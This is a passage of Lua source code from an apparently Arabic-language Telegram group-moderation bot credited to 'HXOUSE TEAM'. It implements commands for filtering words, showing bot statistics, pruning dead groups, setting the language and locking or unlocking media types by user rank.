hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ لم يتم وضع رد للخاص ارسل (ضع رد الخاص) ليتم حفظه 📥', 1, 'md')
end
end
end
end
-------------------------------------HXOUSE TEAM----------------------------------------------------------
if text:match("^[Aa]ction (.*)$") and is_sudo(msg) then
local lockpt = {string.match(text, "^([Aa]ction) (.*)$")}
if lockpt[2] == "typing" then
sendaction(msg.chat_id_, 'Typing')
end
if lockpt[2] == "video" then
sendaction(msg.chat_id_, 'RecordVideo')
end
if lockpt[2] == "voice" then
sendaction(msg.chat_id_, 'RecordVoice')
end
if lockpt[2] == "photo" then
sendaction(msg.chat_id_, 'UploadPhoto')
end
end
------------------------------------HXOUSE TEAM-----------------------------------------------------------
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Ff]ilter (.*)$") or text:match("^منع (.*)$") then
local filters = {string.match(text, "^([Ff]ilter) (.*)$")}
local filterss = {string.match(text, "^(منع) (.*)$")}
local name = string.sub(filters[2] or filterss[2], 1, 50)
local hash = (HXOUSE..'bot:filters:'..msg.chat_id_)
hxousedx1:hset(hash, name,'newword')
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙  Word [ "..name.." ] has been filtered ", 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ الكلمه [ "..name.." ]\n⌯︙ تم منعها ༯", 1, 'md')
end
end
end
--------------------------------------HXOUSE TEAM---------------------------------------------------------
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Uu]nfilter (.*)$") or text:match("^الغاء منع (.*)$") then
local rws = {string.match(text, "^([Uu]nfilter) (.*)$")}
local rwss = {string.match(text, "^(الغاء منع) (.*)$")}
local name = string.sub(rws[2] or rwss[2], 1, 50)
local cti = msg.chat_id_
local hash = (HXOUSE..'bot:filters:'..msg.chat_id_)
if not hxousedx1:hget(HXOUSE..hash, name) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ Word : ["..name.."] is not in filterlist ", 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ الكلمه [ "..name.." ]\n⌯︙ هي غير ممنوعه في المجموعه ༯", 1, 'md')
end
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ Word : ["..name.."] removed from filterlist ", 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ الكلمه [ "..name.." ]\n⌯︙ تم الغاء منعها ༯", 1, 'md')
end
hxousedx1:hdel(hash, name)
end
end
end
------------------------------------HXOUSE TEAM-----------------------------------------------------------
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Ff]ilteer all (.*)$") or text:match("^فلتر عام (.*)$") then
local filters = {string.match(text, "^([Ff]Filteer all) (.*)$")}
local filterss = {string.match(text, "^(فلتر عام) (.*)$")}
local name = string.sub(filters[2] or filterss[2], 1, 50)
local hash = (HXOUSE..'bot:freewords:')
hxousedx1:hset(hash, name,'newword')
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ Word [ "..name.." ]\n⌯︙ has been filtered all ༯", 1, 'html')
else
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ الكلمه [ "..name.." ]\n⌯︙ تم منعها عام ༯", 1, 'html')
end
end
end
--------------------------------------HXOUSE TEAM---------------------------------------------------------
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Uu]nfilter all (.*)$") or text:match("^الغاء منع عام (.*)$") then
local rws = {string.match(text, "^([Uu]nfilter all) (.*)$")}
local rwss = {string.match(text, "^(الغاء منع عام) (.*)$")}
local name = string.sub(rws[2] or rwss[2], 1, 50)
local cti = msg.chat_id_
local hash = (HXOUSE..'bot:freewords:')
if not hxousedx1:hget(hash, name)then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ Word [ "..name.." ]\n⌯︙ is not in filtered all ༯", 1, 'html')
else
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ الكلمه [ "..name.." ]\n⌯︙ هي ليست ممنوعه عام ༯", 1, 'html')
end
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ Word [ "..name.." ]\n⌯︙ removed from filtered all ༯", 1, 'html')
else
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ الكلمه [ "..name.." ]\n⌯︙ تم الغاء منعها عام ༯", 1, 'html')
end
hxousedx1:hdel(hash, name)
end
end
end
---------------------------------------------HXOUSE TEAM--------------------------------------------------
if text:match("^[Ss]tats$") or text:match("^الاحصائيات$") and is_admin(msg.sender_user_id_, msg.chat_id_) then
local gps = hxousedx1:scard(HXOUSE.."bot:groups")
local users = hxousedx1:scard(HXOUSE.."bot:userss")
local allmgs = hxousedx1:get(HXOUSE.."bot:allmsgs")
if hxousedx1:get(HXOUSE..'autoleave') == "On" then
autoleaveen = "Active"
autoleavear = "مفعل 🌟"
elseif hxousedx1:get(HXOUSE..'autoleave') == "Off" then
autoleaveen = "Deactive"
autoleavear = "معطل ༯"
elseif not hxousedx1:get(HXOUSE..'autoleave') then
autoleaveen = "Deactive"
autoleavear = "معطل ༯"
end
if hxousedx1:get(HXOUSE..'clerk') == "On" then
clerken = "Active"
clerkar = "مفعل 🌟"
elseif hxousedx1:get(HXOUSE..'clerk') == "Off" then
clerken = "Deactive"
clerkar = "معطل ༯"
elseif not hxousedx1:get(HXOUSE..'clerk') then
clerken = "Deactive"
clerkar = "معطل ??"
end
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Status ༯ \n\n⌯︙ Groups  '..gps..'\n\n👥┇ Users  '..users..' \n\n⌯︙ Msg received  '..allmgs..'\n\n🎙┇ Auto Leave  '..autoleavear..'\n\n💢┇ Clerk  '..clerkar, 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ احصائيات البوت ༯ \n⌯︙ عدد الكروبات  '..gps..'\n⌯︙ عدد الاعضاء  '..users..' \n⌯︙ عدد كل رسائل المجموعات  '..allmgs..'\n⌯︙ المغادره التلقائيه  '..autoleavear..'\n⌯︙ رد الخاص  '..clerkar, 1, 'md')
end
end
---------------------------------------HXOUSE TEAM---------------------------------------
if text == "تنظيف الكروبات" and is_sudo(msg) then 
local group = hxousedx1:smembers(HXOUSE.."bot:groups")
local w = 0
local q = 0
for i = 1, #group do
tdcli_function({ID='GetChat',chat_id_ = group[i]
},function(arg,data)
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
print('\27[30;34m»» THE BOT IS NOT ADMIN ↓\n»» '..group[i]..'\n\27[1;37m')
hxousedx1:srem(HXOUSE.."bot:groups",group[i]) 
changeChatMemberStatus(group[i], bot_id, "Left")
w = w + 1
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
hxousedx1:srem( HXOUSE.."bot:groups",group[i]) 
q = q + 1
print('\27[30;35m»» THE BOT IS LEFT GROUP ↓\n»» '..group[i]..'\n\27[1;37m')
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusKicked" then
hxousedx1:srem( HXOUSE.."bot:groups",group[i]) 
q = q + 1
print('\27[30;36m»» THE BOT IS KICKED GROUP ↓\n»» '..group[i]..'\n\27[1;37m')
end
if data and data.code_ and data.code_ == 400 then
hxousedx1:srem( HXOUSE.."bot:groups",group[i]) 
w = w + 1
end
if #group == i then 
if (w + q) == 0 then
hxousedx(msg.chat_id_, msg.id_, 1,'⌯︙لا يوجد كروبات وهميه\n', 1, 'md')   
else
local hxouseddx2 = (w + q)
local hxousedx3 = #group - hxouseddx2
if q == 0 then
hxouseddx2 = ''
else
hxouseddx2 = '\n*⌯︙ تم مسح ⌯» { '..q..' } مجموعه من البوت*'
end
if w == 0 then
hxouseddx1 = ''
else
hxouseddx1 = '\n*⌯︙ تم مسح ⌯» { '..w..' } كروب بسبب تنزيل البوت عضو*'
end
hxousedx(msg.chat_id_, msg.id_, 1,'*⌯︙ عدد الكروبات الان ⌯» { '..#group..' }*'..hxouseddx1..''..hxouseddx2..'\n*⌯︙العدد الحقيقي الان ⌯» ( '..hxousedx3..' ) كروب*\n', 1, 'md')
end
end
end,nil)
end
return false
end 
------------------------------------------------------------------------------
if text:match("^[Nn]amegp$") or text:match("^اسم المجموعه$") and is_momod(msg.sender_user_id_, msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ اسم المجموعه {"..title_name(msg.chat_id_).."}", 1, 'md')
end 

-----------------------------------------------------------------------------------------------
if text:match("^[Rr]esmsg$") or text:match("^تنظيف الرسائل$") and is_sudo(msg) then
hxousedx1:del(HXOUSE.."bot:allmsgs")
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ All msg received has been reset ', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم تنظيف عدد رسائل الكروبات ', 'md')
end
end
--------------------------------------------HXOUSE TEAM---------------------------------------------------
if text:match("^[Ss]etlang (.*)$") or text:match("^ضع اللغه (.*)$") and is_owner(msg.sender_user_id_, msg.chat_id_) then
local langs = {string.match(text, "^(.*) (.*)$")}
if langs[2] == "ar" or langs[2] == "العربيه" then
if not hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم وضع اللغه العربيه مسبقا ', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم وضع اللغه العربيه في المجموعه ', 1, 'md')
hxousedx1:del(HXOUSE..'lang:gp:'..msg.chat_id_)
end
end
if langs[2] == "en" or langs[2] == "الانكليزيه" then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *Language Bot is already English* ', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *Language Bot has been changed to English* ', 1, 'md')
hxousedx1:set(HXOUSE..'lang:gp:'..msg.chat_id_,true)
end
end
end
---------------------------------HXOUSE TEAM--------------------------------------------------------------
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Uu]nlock (.*)$") or text:match("^فتح (.*)$") and hxouse11(msg) then
local unlockpt = {string.match(text, "^([Uu]nlock) (.*)$")}
if is_leaderid(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_sudoid(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_admin(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_onall(msg.sender_user_id_) then
tar = 'المدير 🥇'
elseif is_moall(msg.sender_user_id_) then
tar = 'الادمن 🥈'
elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
tar = 'المنشئ 🎖'
elseif is_monsh2(msg.sender_user_id_, msg.chat_id_) then
tar = 'المنشئ 🎖'
elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
tar = 'المدير 🥇'
elseif is_momod(msg.sender_user_id_, msg.chat_id_) then
tar = 'الادمن 🥈'          
end
local unlockpts = {string.match(text, "^(فتح) (.*)$")}
if unlockpt[2] == "edit" or unlockpts[2] == "التعديل" then
if hxousedx1:get(HXOUSE..'editmsg'..msg.chat_id_) then
local hxouse = '⌯︙ رتبتك : '..tar..' \n⌯︙ تم فتح »   التعديل  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 59, string.len(msg.sender_user_id_))
hxousedx1:del(HXOUSE..'editmsg'..msg.chat_id_)
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم فتح »  التعديل سابقا ༯', 1, 'md')
end
end
if unlockpts[2] == "الفارسيه" then
if hxousedx1:get(HXOUSE..'farsi'..msg.chat_id_) then
local hxouse = '⌯︙ رتبتك : '..tar..' \n⌯︙ تم فتح »   الفارسيه  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 60, string.len(msg.sender_user_id_))
hxousedx1:del(HXOUSE..'farsi'..msg.chat_id_)
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم فتح »  الفارسيه سابقا ༯', 1, 'md')
end
end
if unlockpts[2] == "الفارسيه بالطرد" then
if hxousedx1:get(HXOUSE..'farsiban'..msg.chat_id_) then
local hxouse = '⌯︙ رتبتك : '..tar..' \n⌯︙ تم فتح »   الفارسيه بالطرد  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 67, string.len(msg.sender_user_id_))
hxousedx1:del(HXOUSE..'farsiban'..msg.chat_id_)
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم فتح »  الفارسيه بالطرد سابقا ༯', 1, 'md')
end
end
if unlockpt[2] == "cmd" or unlockpts[2] == "الشارحه" then
if hxousedx1:get(HXOUSE..'bot:cmds'..msg.chat_id_) then
local hxouse = '⌯︙ رتبتك : '..tar..' \n⌯︙ تم فتح »   الشارحه  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 59, string.len(msg.sender_user_id_))
hxousedx1:del(HXOUSE..'bot:cmds'..msg.chat_id_)
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم فتح »  الشارحه سابقا ༯', 1, 'md')
end
end
if unlockpt[2] == "bots" or unlockpts[2] == "البوتات" then
if hxousedx1:get(HXOUSE..'bot:bots:mute'..msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Has been unlock bots ༯', 1, 'md')
else
local hxouse = '⌯︙ رتبتك : '..tar..' \n⌯︙ تم فتح »   البوتات  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 59, string.len(msg.sender_user_id_))
end
hxousedx1:del(HXOUSE..'bot:bots:mute'..msg.chat_id_)
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ bots » is already unlocked 🔑', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم فتح البوتات سابقا ༯', 1, 'md')
end
end
end
if unlockpt[2] == "bots ban" or unlockpts[2] == "البوتات بالطرد" then
if hxousedx1:get(HXOUSE..'bot:bots:ban'..msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Has been unlock bots ban༯', 1, 'md')
else
local hxouse = '⌯︙ رتبتك : '..tar..' \n⌯︙ تم فتح »   البوتات بالطرد  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 66, string.len(msg.sender_user_id_))
end
hxousedx1:del(HXOUSE..'bot:bots:ban'..msg.chat_id_)
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ bots is already unlocked ban ༯', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم فتح »  البوتات بالطرد سابقا ༯', 1, 'md')
end
end
end
if unlockpt[2] == "bots keed" or unlockpts[2] == "البوتات بالتقييد" then
if hxousedx1:get(HXOUSE..'keed_bots'..msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Has been unlock bots keed ༯', 1, 'md')
else
local hxouse = '⌯︙ رتبتك : '..tar..' \n⌯︙ تم فتح »   البوتات بالتقييد  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 68, string.len(msg.sender_user_id_))
end
hxousedx1:del(HXOUSE..'keed_bots'..msg.chat_id_)
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ bots is already unlocked keed ༯', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم فتح »  البوتات بالتقييد سابقا ༯', 1, 'md')
end
end
end
if unlockpt[2] == "flood" or unlockpts[2] == "التكرار" then
if hxousedx1:get(HXOUSE..'anti-flood:'..msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Has been unlock flood ༯', 1, 'md')
else
local hxouse = '⌯︙ رتبتك : '..tar..' \n⌯︙ تم فتح »   التكرار  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 59, string.len(msg.sender_user_id_))
end
hxousedx1:del(HXOUSE..'anti-flood:'..msg.chat_id_)
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ flood » is already unlocked 🔑', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم فتح »  التكرار سابقا ༯', 1, 'md')
end
end
end
if unlockpt[2] == "pin" or unlockpts[2] == "التثبيت" then
if hxousedx1:get(HXOUSE..'bot:pin:mute'..msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Has been unlock pin ༯', 1, 'md')
else
local hxouse = '⌯︙ رتبتك : '..tar..' \n⌯︙ تم فتح »   التثبيت  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 59, string.len(msg.sender_user_id_))
end
hxousedx1:del(HXOUSE..'bot:pin:mute'..msg.chat_id_)
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ pin » is already unlocked 🔑', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم فتح »  التثبيت سابقا ༯', 1, 'md')
end
end
end
end
end
------------------------------------HXOUSE TEAM-----------------------------------------------------------
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Ll]ock gtime (%d+)$") and hxouse11(msg) then
local mutept = {string.match(text, "^[Ll]ock gtime (%d+)$")}
local hour = string.gsub(mutept[1], 'h', '')
local num1 = tonumber(hour) * 3600
local num = tonumber(num1)
hxousedx1:setex(HXOUSE..'bot:muteall'..msg.chat_id_, num, true)
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ Lock all has been enable for "..mutept[1].." hours ", 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ تم قفل الكل لمده "..mutept[1].." ساعه ", 'md')
end
end
if text:match("^قفل الكل بالساعات (%d+)$") and hxouse11(msg) then
local mutept = {string.match(text, "^قفل الكل بالساعات (%d+)$")}
local hour = string.gsub(mutept[1], 'h', '')
local num1 = tonumber(hour) * 3600
local num = tonumber(num1)
hxousedx1:setex(HXOUSE..'bot:muteall'..msg.chat_id_, num, true)
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ Lock all has been enable for "..mutept[1].." hours ", 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ تم قفل الكل لمده "..mutept[1].." ساعه ", 'md')
end
end
end
-----------------------------------------HXOUSE TEAM------------------------------------------------------
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Ll]ock (.*)$") or text:match("^قفل (.*)$") and hxouse11(msg) then
local mutept = {string.match(text, "^([Ll]ock) (.*)$")}
if is_leaderid(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_sudoid(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_admin(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_onall(msg.sender_user_id_) then
tar = 'المدير 🥇'
elseif is_moall(msg.sender_user_id_) then
tar = 'الادمن 🥈'
elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
tar = 'المنشئ 🎖'
elseif is_monsh2(msg.sender_user_id_, msg.chat_id_) then
tar = 'المنشئ 🎖'
elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
tar = 'المدير 🥇'
elseif is_momod(msg.sender_user_id_, msg.chat_id_) then
tar = 'الادمن 🥈'          
end
local mutepts = {string.match(text, "^(قفل) (.*)$")}
if mutept[2] == "all" or  mutepts[2] == "الكل" then 
if not hxousedx1:get(HXOUSE..'bot:text:mute'..msg.chat_id_) and not hxousedx1:get(HXOUSE..'bot:inline:mute'..msg.chat_id_) and not hxousedx1:get(HXOUSE..'bot:photo:mute'..msg.chat_id_) and not hxousedx1:get(HXOUSE..'bot:spam:mute'..msg.chat_id_) and not hxousedx1:get(HXOUSE..'bot:video:mute'..msg.chat_id_) and not hxousedx1:get(HXOUSE..'bot:gifs:mute'..msg.chat_id_) and not hxousedx1:get(HXOUSE..'bot:music:mute'..msg.chat_id_) and not hxousedx1:get(HXOUSE..'bot:voice:mute'..msg.chat_id_) and not hxousedx1:get(HXOUSE..'bot:links:mute'..msg.chat_id_) and not hxousedx1:get(HXOUSE..'bot:location:mute'..msg.chat_id_) and not hxousedx1:get(HXOUSE..'tags:lock'..msg.chat_id_) and not hxousedx1:get(HXOUSE..'bot:strict'..msg.chat_id_) and not hxousedx1:get(HXOUSE..'bot:document:mute'..msg.chat_id_) and not hxousedx1:get(HXOUSE..'bot:hashtag:mute'..msg.chat_id_) and not hxousedx1:get(HXOUSE..'bot:contact:mute'..msg.chat_id_) and not hxousedx1:get(HXOUSE..'bot:webpage:mute'..msg.chat_id_) and not hxousedx1:get(HXOUSE..'bot:arabic:mute'..msg.chat_id_) and not hxousedx1:get(HXOUSE..'bot:english:mute'..msg.chat_id_) and not hxousedx1:get(HXOUSE..'bot:sticker:mute'..msg.chat_id_) and not hxousedx1:get(HXOUSE..'markdown:lock'..msg.chat_id_) and not hxousedx1:get(HXOUSE..'bot:forward:mute'..msg.chat_id_) and not hxousedx1:get(HXOUSE..'editmsg'..msg.chat_id_) and not hxousedx1:get(HXOUSE..'bot:cmds'..msg.chat_id_) and not hxousedx1:get(HXOUSE..'bot:bots:mute'..msg.chat_id_) and not hxousedx1:get(HXOUSE..'bot:bots:ban'..msg.chat_id_) and not hxousedx1:get(HXOUSE..'keed_bots'..msg.chat_id_) and not hxousedx1:get(HXOUSE..'anti-flood:'..msg.chat_id_) and not hxousedx1:get(HXOUSE..'bot:pin:mute'..msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Has been lock all ༯', 1, 'md')
else
local hxouse = '⌯︙ رتبتك : '..tar..' \n⌯︙ تم قفل »  كل الوسائط  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 61, string.len(msg.sender_user_id_))
end 
hxousedx1:set(HXOUSE..'editmsg'..msg.chat_id_,true)
hxousedx1:set(HXOUSE..'bot:cmds'..msg.chat_id_,true)
hxousedx1:set(HXOUSE..'bot:bots:mute'..msg.chat_id_,true)
hxousedx1:set(HXOUSE..'bot:bots:ban'..msg.chat_id_,true)
hxousedx1:set(HXOUSE..'keed_bots'..msg.chat_id_,true)
hxousedx1:set(HXOUSE..'anti-flood:'..msg.chat_id_,true)
hxousedx1:set(HXOUSE..'bot:pin:mute'..msg.chat_id_,true)
hxousedx1:set(HXOUSE..'bot:text:mute'..msg.chat_id_,true)
hxousedx1:set(HXOUSE..'bot:inline:mute'..msg.chat_id_,true)
hxousedx1:set(HXOUSE..'bot:photo:mute'..msg.chat_id_,true)
hxousedx1:set(HXOUSE..'bot:spam:mute'..msg.chat_id_,true)
hxousedx1:set(HXOUSE..'bot:video:mute'..msg.chat_id_,true)
hxousedx1:set(HXOUSE..'bot:gifs:mute'..msg.chat_id_,true)
hxousedx1:set(HXOUSE..'bot:music:mute'..msg.chat_id_,true)
hxousedx1:set(HXOUSE..'bot:voice:mute'..msg.chat_id_,true)
hxousedx1:set(HXOUSE..'bot:links:mute'..msg.chat_id_,true)
hxousedx1:set(HXOUSE..'bot:location:mute'..msg.chat_id_,true)
hxousedx1:set(HXOUSE..'tags:lock'..msg.chat_id_,true)
hxousedx1:set(HXOUSE..'bot:strict'..msg.chat_id_,true)
hxousedx1:set(HXOUSE..'bot:document:mute'..msg.chat_id_,true)
hxousedx1:set(HXOUSE..'bot:hashtag:mute'..msg.chat_id_,true)
hxousedx1:set(HXOUSE..'bot:contact:mute'..msg.chat_id_,true)
hxousedx1:set(HXOUSE..'bot:webpage:mute'..msg.chat_id_,true)
hxousedx1:set(HXOUSE..'bot:arabic:mute'..msg.chat_id_,true)
hxousedx1:set(HXOUSE..'bot:english:mute'..msg.chat_id_,true)
hxousedx1:set(HXOUSE..'bot:sticker:mute'..msg.chat_id_,true)
hxousedx1:set(HXOUSE..'markdown:lock'..msg.chat_id_,true)
hxousedx1:set(HXOUSE..'bot:forward:mute'..msg.chat_id_,true)
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ all is already locked ༯', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم قفل كل الوسائط سابقا ༯', 1, 'md')
end
end
end
if mutept[2] == "text" or mutepts[2] == "الدردشه" then
if not hxousedx1:get(HXOUSE..'bot:text:mute'..msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Has been lock text ༯', 1, 'md')
else
local hxouse = '⌯︙ رتبتك : '..tar..' \n⌯︙ تم قفل »  الدردشه  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 58, string.len(msg.sender_user_id_))
end
hxousedx1:set(HXOUSE..'bot:text:mute'..msg.chat_id_,true)
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ text is already locked ༯', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم قفل الدردشه سابقا ༯', 1, 'md')
end
end
end
if mutept[2] == "inline" or mutepts[2] == "الاونلاين" then
if not hxousedx1:get(HXOUSE..'bot:inline:mute'..msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Has been lock inline ༯', 1, 'md')
else
local hxouse = '⌯︙ رتبتك : '..tar..' \n⌯︙ تم قفل »  الاونلاين  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 60, string.len(msg.sender_user_id_))
end
hxousedx1:set(HXOUSE..'bot:inline:mute'..msg.chat_id_,true)
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ inline is already locked ༯', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم قفل الاونلاين سابقا ༯', 1, 'md')
end
end
end
if mutept[2] == "photo" or mutepts[2] == "الصور" then
if not hxousedx1:get(HXOUSE..'bot:photo:mute'..msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Has been lock photo ༯', 1, 'md')
else
local hxouse = '⌯︙ رتبتك : '..tar..' \n⌯︙ تم قفل »  الصور  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 56, string.len(msg.sender_user_id_))
end
hxousedx1:set(HXOUSE..'bot:photo:mute'..msg.chat_id_,true)
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ photo is already locked ༯', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم قفل الصور سابقا ༯', 1, 'md')
end
end
end
if mutept[2] == "spam" or mutepts[2] == "الكلايش" then
if not hxousedx1:get(HXOUSE..'bot:spam:mute'..msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Has been lock spam ༯', 1, 'md')
else
